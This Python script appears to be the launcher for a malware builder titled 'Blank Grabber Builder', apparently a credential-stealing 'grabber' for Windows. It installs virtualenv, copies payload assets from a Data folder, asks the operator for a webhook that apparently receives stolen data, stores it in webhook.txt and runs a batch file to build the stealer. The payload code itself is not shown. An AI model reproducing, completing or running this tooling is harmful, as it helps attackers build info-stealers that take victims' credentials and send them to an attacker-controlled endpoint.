import os, subprocess, shutil, socket

def clear():
	os.system("cls")

def checkmodules():
	code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
	if code != 0:
		clear()
		print(format1("\u001b[33;1mInstalling virtualenv...") + "\n")
		os.system("pip install --quiet --upgrade virtualenv")

def exit():
	os.system("pause > NUL")
	quit()

def format1(title, description= ""):
	return f"[{title}\u001b[0m] \u001b[37;1m{description}\u001b[0m"

def main():
	if os.name != "nt":
		print(format1("\u001b[31;1mERROR", "The program can only be run on Windows!"))
		exit()
	clear()
	os.system("title Blank Grabber Builder")
	try:
		socket.create_connection(("1.1.1.1", 53))
	except OSError:
		print(format1("\u001b[31;1mERROR", "Internet connection is not available!"))
		exit()

	if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Data")):
		print(format1("\u001b[31;1mERROR", "Data folder not found!"))
		exit()

	print(format1("\u001b[33;1mINFO", "Checking modules..."))
	checkmodules()
	clear()

	if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "env", "Scripts")):
			print(format1("\u001b[33;1mINFO", "Creating virtualenv... (might take some time)"))
			subprocess.run("virtualenv env", capture_output= True, shell= True)
			clear()
		print(format1("\u001b[33;1mINFO", "Copying assets to virtualenv"))
		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
			if os.path.isfile(fileloc := os.path.join(datadir, i)):
				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
			else:
				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
		clear()
	while True:
		with open(webhookfile := os.path.join("env", "Scripts", "webhook.txt")) as file:
			if (existing_webhook := len(file.read()) > 100):
				print(format1("\u001b[33;1mINFO", "An existing webhook is found, enter a new one or leave empty") + "\n")
		webhook = input(format1("\u001b[33;1mEnter Webhook") + "\b: \u001b[36;1m").strip()
		clear()
		if len(webhook) > 100 or (existing_webhook and len(webhook) == 0):
			break
	if len(webhook) > 100:
		with open(webhookfile, "w") as file:
			file.write(webhook)
	os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
	print("\u001b[0m", end= "", flush= True)
	os.system("run")

if __name__ == '__main__':
	main()